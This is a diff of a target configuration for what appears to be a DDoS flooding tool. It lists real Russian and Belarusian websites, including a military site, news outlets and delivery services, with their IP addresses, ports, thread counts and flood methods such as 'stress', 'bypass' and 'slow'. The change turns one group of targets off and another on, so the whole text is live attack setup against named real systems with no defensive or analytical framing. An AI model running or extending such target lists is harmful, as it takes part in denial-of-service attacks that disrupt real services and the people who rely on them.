@@ -24,13 +24,13 @@ https://boxberry.ru/ https://argumenti.ru/ tcp://5.189.239.12:8888 tcp://5.189.2
 
 #https://meteoinfo.ru http://meteoinfo.ru https://meteoinfo.ru/novosti http://193.7.160.228:80 https://193.7.160.228:443 tcp://193.7.160.228:80 tcp://193.7.160.228:443 -t 1000 --http-methods bypass stress DOWNLOADER
 
-https://www.5-tv.ru http://www.5-tv.ru https://www.5-tv.ru/schedule/ http://ctv.by http://ctv.by/tv-programm-voskr https://www.sb.by https://www.sb.by/articles/themes/situatsiya-vokrug-dnr-i-lnr/  https://ekdostavka.ru http://ekdostavka.ru  -t 2000 --http-methods DOWNLOADER BYPASS SLOW
+#https://www.5-tv.ru http://www.5-tv.ru https://www.5-tv.ru/schedule/ http://ctv.by http://ctv.by/tv-programm-voskr https://www.sb.by https://www.sb.by/articles/themes/situatsiya-vokrug-dnr-i-lnr/  https://ekdostavka.ru http://ekdostavka.ru  -t 2000 --http-methods DOWNLOADER BYPASS SLOW
 
 #https://ekdostavka.ru http://ekdostavka.ru 82.202.172.28:80 82.202.172.28:443 https://82.202.172.28:443 tcp://82.202.172.28:21 tcp://82.202.172.28:22 tcp://82.202.172.28:80 tcp://82.202.172.28:443 tcp://82.202.172.28:587 tcp://82.202.172.28:110 -t 1500 --http-methods stress get head
 
 #https://www.5-tv.ru http://www.5-tv.ru https://www.5-tv.ru/schedule/ http://ctv.by http://ctv.by/tv-programm-voskr https://www.sb.by https://www.sb.by/articles/themes/situatsiya-vokrug-dnr-i-lnr/ 151.236.80.10:80 151.236.80.10:443 tcp://151.236.80.10:80 tcp://151.236.80.10:443 -t 1500 --http-methods stress bypass head
 
-#https://cargocash.ru/ http://cargocash.ru/  http://188.225.36.11:80 http://188.225.36.11:443 https://188.225.36.11:443 tcp://188.225.36.11:22 tcp://188.225.36.11:80 tcp://188.225.36.11:143 tcp://188.225.36.11:3306 tcp://188.225.36.11:443 -t 1000 --http-methods stress get head
+https://cargocash.ru/ http://cargocash.ru/  http://188.225.36.11:80 http://188.225.36.11:443 https://188.225.36.11:443 tcp://188.225.36.11:22 tcp://188.225.36.11:80 tcp://188.225.36.11:143 tcp://188.225.36.11:3306 tcp://188.225.36.11:443 -t 1000 --http-methods stress get head
 #94.228.116.171:80 94.228.116.171:443 https://94.228.116.171:443 tcp://94.228.116.171:443 tcp://94.228.116.171:22 tcp://94.228.116.171:80 tcp://94.228.116.171:143 tcp://94.228.116.171:3306 -t 1000 --http-methods stress get head
 
 #https://mil.ru http://mil.ru 87.242.66.56:80 87.242.66.56:443 https://87.242.66.56:443 tcp://87.242.66.56:443 tcp://87.242.66.56:80 -t 1000 --http-methods bypass get stress
